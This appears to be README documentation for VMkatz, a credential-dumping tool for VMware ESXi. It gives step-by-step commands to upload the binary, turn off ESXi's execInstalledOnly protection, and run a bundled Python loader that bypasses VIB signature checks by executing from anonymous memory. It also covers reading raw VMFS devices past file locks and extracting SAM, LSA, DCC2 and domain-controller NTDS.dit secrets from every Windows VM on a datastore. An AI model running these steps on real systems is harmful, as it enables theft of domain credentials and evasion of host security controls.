# Deployment on ESXi

VMkatz compiles to a static musl binary that runs directly on ESXi without dependencies:

```bash
# Cross-compile for ESXi (musl static)
cargo build --release --target x86_64-unknown-linux-musl

# Upload (~3 MB)
scp target/x86_64-unknown-linux-musl/release/vmkatz root@esxi:/tmp/

# On ESXi 8.0+, allow non-VIB binaries (requires once)
esxcli system settings advanced set -o /User/execInstalledOnly -i 0

# Extract from a live VM snapshot
/tmp/vmkatz /vmfs/volumes/datastore1/MyVM/MyVM-Snapshot1.vmsn

# Extract SAM from a powered-off VM disk
/tmp/vmkatz /vmfs/volumes/datastore1/MyVM/MyVM-flat.vmdk
```

## Running with VIB protection enabled

When `execInstalledOnly` is set to 1 (default on ESXi 7.0+), unsigned binaries cannot be executed directly. The included Python loader (`tools/vmkatz_loader.py`, bundled in the ESXi release archive) bypasses this by loading vmkatz into anonymous memory pages — ESXi allows `PROT_EXEC` on anonymous mappings while blocking `execve` on unsigned files.

Python is included in ESXi 6.x and later (used internally by VMware hostd/CIM providers) and can execute normally regardless of VIB settings.

```bash
# Upload both files
scp tools/vmkatz_loader.py target/x86_64-unknown-linux-musl/release/vmkatz root@esxi:/tmp/

# Run through the loader (no need to disable execInstalledOnly)
python3 /tmp/vmkatz_loader.py /tmp/vmkatz /vmfs/volumes/datastore1/MyVM/snapshot.vmsn

# Works on ESXi 6.5+ (Python 2.7), 6.7+ (Python 3.5), 8.0+ (Python 3.8)
python /tmp/vmkatz_loader.py /tmp/vmkatz --vmfs-list
```

The loader parses the ELF binary, maps segments into anonymous pages, applies relocations, and jumps to the entry point. No files are written to disk, no VIB signature check is triggered.

To check if VIB protection is active on your ESXi host:
```bash
esxcli system settings advanced list -o /User/execInstalledOnly
```

## VMFS Raw Device Access

On ESXi, VMFS locks prevent reading flat VMDK files from running VMs via the mounted filesystem. VMkatz includes a self-contained VMFS-5/6 parser that reads directly from the raw SCSI device, bypassing file locks entirely — no `vmkfstools`, no `.sbc.sf` access, no unmounting.

### Discovery

VMkatz auto-discovers VMFS devices by scanning `/dev/disks/` for SCSI LUNs containing VMFS superblocks, then enumerates the VMFS directory tree to find all flat VMDKs and the VMs they belong to.

```bash
# Discover all VMFS datastores, list their VMs, and print ready-to-run commands
/tmp/vmkatz --vmfs-list
```

Example output:
```
[+] VMFS-6 devices:
    /dev/disks/naa.60003ff44dc75adcb3d1cbcd6d5049dc — RAID0_local
    /dev/disks/naa.600508b4000adfe0d80b99cf3ce0c0c7 — NAS_datastore

[+] RAID0_local — 5 flat VMDKs:
--vmfs-device /dev/disks/naa.60003ff44dc75adcb3d1cbcd6d5049dc --vmdk 'DC01/DC01-flat.vmdk'
--vmfs-device /dev/disks/naa.60003ff44dc75adcb3d1cbcd6d5049dc --vmdk 'WEB01/WEB01-flat.vmdk'
...
```

The output is designed as copy-pasteable command-line arguments. Filter to a specific device with `--vmfs-device`:

```bash
# List VMDKs on a specific device only
/tmp/vmkatz --vmfs-list --vmfs-device /dev/disks/naa.60003ff44dc75adcb3d1cbcd6d5049dc
```

### Extraction modes

```bash
# Single VM — extract SAM/LSA/DCC2 from one flat VMDK
/tmp/vmkatz --vmfs-device /dev/disks/naa.xxx --vmdk 'DC01/DC01-flat.vmdk'

# Single VM — extract NTDS.dit from a domain controller
/tmp/vmkatz --vmfs-device /dev/disks/naa.xxx --vmdk 'DC01/DC01-flat.vmdk' --ntds

# All VMs — auto-scan the entire datastore
/tmp/vmkatz --vmfs-device /dev/disks/naa.xxx
```

In auto-scan mode (no `--vmdk`), VMkatz discovers every flat VMDK on the device, checks each for NTFS partitions (skipping Linux/BSD VMs), and extracts credentials from all Windows VMs in a single pass. Non-Windows VMs are silently skipped.

### How it works

The parser resolves the full VMFS on-disk layout without any mounted filesystem:

```
/dev/disks/naa.xxx
  └─ LVM volume header (magic 0xC001D00D at offset 0x100000)
       └─ VMFS superblock (magic 0x2FABF15E at offset 0x200000)
            └─ SFD bootstrap → FDC resource (file descriptor cache)
                 └─ Root directory (FD address 0x00000004)
                      └─ VM directories → flat VMDK files
                           └─ File data (sub-blocks, pointer blocks, large file blocks)
```

Supports all VMFS-5/6 address types: small file blocks (SFB/FB), sub-blocks (SB), pointer blocks (PB/PB2), large file blocks (LFB), and double-indirect addressing. Reads are direct `pread(2)` calls on the raw device — no caching layer or filesystem driver needed.
